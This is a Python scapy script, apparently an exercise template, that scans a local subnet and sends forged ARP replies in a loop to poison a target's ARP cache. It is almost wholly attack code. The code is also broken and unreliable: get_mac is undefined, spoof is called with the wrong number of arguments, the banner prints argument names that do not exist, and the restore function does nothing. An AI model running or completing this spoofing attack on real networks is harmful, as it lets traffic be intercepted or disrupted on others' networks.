from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp, conf, get_if_addr
import time
import sys
import argparse
import random

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        )
    
def scan():
    ip="192.168.1.0/24"
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    devices_list = []
    for element in answered_list:
        device_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        devices_list.append(device_dict)
    current_ip = get_if_addr(conf.iface)
    current_mac = get_if_hwaddr(conf.iface)
    current_device = {"ip": current_ip, "mac": current_mac}
    devices_list.append(current_device)
    return devices_list

################################################## CHANGE after this line ##################################################
def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip)
    packet = Ether(dst=target_mac, src=get_if_hwaddr(interface)) / \
             ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=0)
    return

def restore(destination_ip, source_ip, interface):
    return

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='ARP Storm')
    parser.add_argument('target', help='IP of first target')
    parser.add_argument('-i', '--interface', default='eth0',
                       help='Network interface (default: eth0)')
    parser.add_argument('-s', '--storm', default=False, action='store_true',
                       help='Enable ARP storm')
    
    args = parser.parse_args()
    
    ip = args.target
    iface = args.interface
    storm = args.storm
    
    try:
        print(f"[*] Starting ARP spoofing attack between {args.target1} and {args.target2}")
        while True:
            spoof(ip, iface)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables")
        restore(ip, iface)
        sys.exit(0)
        
